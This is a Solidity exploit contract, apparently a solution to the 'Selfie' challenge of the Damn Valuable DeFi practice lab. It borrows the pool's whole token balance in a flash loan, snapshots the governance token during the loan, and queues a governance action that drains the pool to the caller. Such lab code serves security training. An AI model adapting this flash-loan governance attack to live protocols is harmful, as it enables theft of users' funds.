// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "./../DamnValuableToken.sol";

contract SelfieExploit {
    uint256 actionId;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public dvts;

    constructor(address _pool, address _governance, address _dvts) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        dvts = DamnValuableTokenSnapshot(_dvts);
    }

    receive() external payable {}
    
    function attack() external {
        pool.flashLoan(dvts.balanceOf(address(pool)));
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                msg.sender
            ),
            0
        );
    }

    function receiveTokens(address token, uint256 amount) external {
        dvts.snapshot();
        dvts.transfer(address(pool), amount);
    }

    function getActionId() external view returns(uint256){
        return actionId;
    }
}